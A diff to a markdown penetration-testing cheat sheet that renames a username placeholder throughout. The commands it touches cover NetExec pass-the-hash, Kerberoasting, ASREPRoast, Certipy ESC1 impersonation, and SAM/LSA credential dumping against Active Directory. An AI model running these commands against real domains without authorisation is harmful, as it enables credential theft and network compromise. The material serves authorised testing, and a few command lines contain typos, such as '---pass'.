@@ -337,7 +337,7 @@ How to pentest like a Gunnaj
   <summary> NetExec local authentication </summary> 
   
   ```shell
-  NetExec smb <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
+  NetExec smb <target_IP> -u <AD_user> -H <hash[LM:NT]> --local-auth 
   ```
 
 </details> 
@@ -514,7 +514,7 @@ NetExec smb <target_IP> -u <local_user> -H <hash[LM:NT]> --local-auth --loggedon
   <summary> List readable or writable shares </summary> 
 
 ```shell
-NetExec smb <target_IP> -u <username> -p <password>  --shares --filter-shares READ WRITE
+NetExec smb <target_IP> -u AD_user -p <password>  --shares --filter-shares READ WRITE
 ```
 
 </details>
@@ -523,7 +523,7 @@ NetExec smb <target_IP> -u <username> -p <password>  --shares --filter-shares RE
   <summary> List uncommon shares and export as xlsx </summary> 
 
 ```shell
-python3 ./FindUncommonShares.py -au <username> -ap <password> -ad <AD_domain> -ai <Domain_Controller_IP> --readable --export-xlsx shares
+python3 ./FindUncommonShares.py -au AD_user -ap <password> -ad <AD_domain> -ai <Domain_Controller_IP> --readable --export-xlsx shares
 ```
 
 </details> 
@@ -792,7 +792,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> Netexec misconfigured delegation </summary> 
   
   ```shell
-  NetExec ldap <Domain_Controller_IP> -u <username> -p <password> --find-delegation
+  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> --find-delegation
   ```
 </details> 
 
@@ -800,7 +800,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> Netexec trusted for delegation </summary> 
 
   ```shell
-  NetExec ldap <Domain_Controller_IP> -u <username> -p <password> --trusted-for-delegation
+  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> --trusted-for-delegation
   ```
     
 </details> 
@@ -811,7 +811,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> NetExec list all PKI enrollment servers </summary> 
   
   ```shell
-  NetExec ldap <Domain_Controller_IP> -u <username> -p <password> -M adcs
+  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> -M adcs
   ```
 </details> 
 
@@ -819,7 +819,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> Certipy find vulnerable certificates </summary> 
   
   ```shell
-  certipy find -u <username> -p <password> -dc-ip <Domain_Controller_IP> -vulnerable -stdout
+  certipy find -u <AD_user> -p <password> -dc-ip <Domain_Controller_IP> -vulnerable -stdout
   ```
 </details> 
 
@@ -827,7 +827,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> ESC1 </summary> 
 
   ```shell
-  certipy req -u <username>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server>  -template <vulnerable_template> -upn <username>@<domain> -sid <user_SID>
+  certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server>  -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>
   ```
 </details> 
 
@@ -836,7 +836,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> Kerberoasting </summary> 
 
   ```shell
-  NetExec ldap <Domain_Controller_IP> -u <username> -p <password> --kerberoasting <output>.txt
+  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> --kerberoasting <output>.txt
   ```
   </details> 
 
@@ -844,7 +844,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> ASREPRoast </summary> 
 
   ```shell
-  NetExec ldap <Domain_Controller_IP> -u <username> -p '' --asreproast <output>.txt
+  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p '' --asreproast <output>.txt
   ```
 
 </details> 
@@ -857,31 +857,31 @@ u.objectid ENDS WITH "-548" RETURN q
   ### Dump NT:hash with masky with domain user
   ### Get ADCS server name
   ```shell
-  NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -M adcs
+  NetExec ldap <target_IP> -u <AD_user> -p <password> -H <hash[LM:NT]]> -M adcs
   ```
 
   ### Retrieve the NT hash using PKINIT
   ```shell
-  NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
+  NetExec ldap <target_IP> -u <AD_user> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
   ```
   
   ### NetExec Dump SAM with domain user
   ```shell
-  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> --sam
+  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash[LM:NT]]> --sam
   ```
 
   ### go-secdump Dump SAM with domain user
   ```shell
-  ./go-secdump --domain <Domain_Controller_IP> --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --sam
+  ./go-secdump --domain <Domain_Controller_IP> --host <target_IP> --user <AD_user> ---pass <password> --hash <hash[LM:NT]]> --sam
   ```
   
   ### NetExec Dump LSA with domain user
   ```shell
-  NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --lsa
+  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> --lsa
   ```
   ### go-secdump Dump LSA with domain user
   ```shell
-  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --lsa
+  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <AD_user> ---pass <password> --hash <hash[LM:NT]]> --lsa
   ```
 
 </details> 
